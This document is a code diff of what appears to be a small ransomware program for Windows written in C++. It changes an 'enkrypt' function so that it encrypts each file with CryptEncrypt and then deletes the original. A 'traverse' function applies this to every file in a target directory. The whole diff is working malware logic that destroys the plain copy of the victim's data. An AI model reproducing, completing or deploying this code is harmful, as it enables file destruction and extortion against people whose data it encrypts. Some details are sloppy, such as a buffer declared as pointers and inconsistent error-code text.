@@ -17,49 +17,38 @@ int enkrypt(WCHAR* srcFile, HCRYPTKEY clé) {
 
 
 	DWORD eof = 0;
-	PBYTE pbBuffer[120];
+	PBYTE pbBuffer[960];
 	DWORD dwBlockLen = 960;
 	DWORD dwBufferLen = 960;
 	DWORD dwCount = 0;
 
 
 	hSourceFile = CreateFileW(szOGFileName, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hSourceFile != INVALID_HANDLE_VALUE) {
+	if (hSourceFile == INVALID_HANDLE_VALUE) {
 
-		std::cout << "The sourcefile is open" << std::endl;
-	}
-	else {
 		DWORD d = GetLastError();
 		std::cout << "Error opening handle to the sourcefile, error code: " << d << std::endl;
 		return -1;
-
 	}
 
-	//wcscat_s(pzDestFile, MAX_PATH, L".kek");
 
 	hDestFile = CreateFileW(pzDestFile, FILE_WRITE_DATA | DELETE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (INVALID_HANDLE_VALUE != hDestFile) {
+	if (INVALID_HANDLE_VALUE == hDestFile) {
 
-		std::cout << "The destfile is open" << std::endl;
-	}
-	else {
 		DWORD d = GetLastError();
 		std::cout << "Error opening handle to the destfile, error code 0x8" << d << std::endl;
 		return -1;
-
 	}
 
 	while (eof == 0) {
 
 		if (ReadFile(hSourceFile, pbBuffer, dwBlockLen, &dwCount, NULL) == 0) {
-
 			DWORD d = GetLastError();
 			std::cout << "Error reading from the sourcefile, error code 0x8:" << d << std::endl;
 			break;
 
 		}
-
-		//std::cout << dwCount << std::endl;
+		
 		if (dwCount < dwBlockLen) {
 
 			eof = 1;
@@ -68,7 +57,7 @@ int enkrypt(WCHAR* srcFile, HCRYPTKEY clé) {
 		if (CryptEncrypt(clé, 0, eof, 0, (BYTE*)pbBuffer, &dwCount, dwBufferLen) == 0) {
 
 			DWORD d = GetLastError();
-			std::cout << "Error encrypting the buffer, error code 0x8" << d << std::endl;
+			std::cout << "Error encrypting the buffer, error code 0x" << d << std::endl;
 			break;
 
 		}
@@ -76,21 +65,22 @@ int enkrypt(WCHAR* srcFile, HCRYPTKEY clé) {
 		if (WriteFile(hDestFile, pbBuffer, dwCount, &dwCount, NULL) == 0) {
 
 			DWORD d = GetLastError();
-			std::cout << "Error writing to the destfile, error code 0x8:" << d << std::endl;
+			std::cout << "Error writing to the destfile, error code 0x:" << d << std::endl;
 			break;
 
 
 		}
-
-		/*if (DeleteFile(pzDestFile) == 0) {
-			DWORD d = GetLastError();
-			std::cout << "Error writing to the destfile, error code 0x8:" << d << std::endl;
-			break;
-
-		}*/
-
-
 	}
+
+	CloseHandle(hSourceFile);
+	CloseHandle(hDestFile);
+
+	if (DeleteFile(szOGFileName) == 0) {
+		DWORD d = GetLastError();
+		std::cout << "Error deleting the OG file, error code 0x:" << d << std::endl;
+		return -1;
+
+}
 
 	return 0;
 }
@@ -108,7 +98,7 @@ bool traverse(LPCWSTR targetDir, HCRYPTKEY clé, int nLevel = 0) {
 
 	hFind = FindFirstFile(szDir, &file_data);
 	if (hFind == INVALID_HANDLE_VALUE) {
-		std::cout << "FindFirstFile failed, with errorcode : " << GetLastError() << std::endl;
+		std::cout << "FindFirstFile failed, with errorcode 0x: " << GetLastError() << std::endl;
 		return false;
 	}
 
@@ -136,8 +126,6 @@ bool traverse(LPCWSTR targetDir, HCRYPTKEY clé, int nLevel = 0) {
 			StringCchCatW(szFullPath, MAX_PATH, L"\\");
 			StringCchCatW(szFullPath, MAX_PATH, file_data.cFileName);
 			enkrypt(szFullPath, clé);
-			//enkrypt(file_data.cFileName,clé);
-			//printf("%ws%ws\n", szOutLine, file.data.cFileName);
 		}
 	} while (FindNextFile(hFind, &file_data) != 0);
 
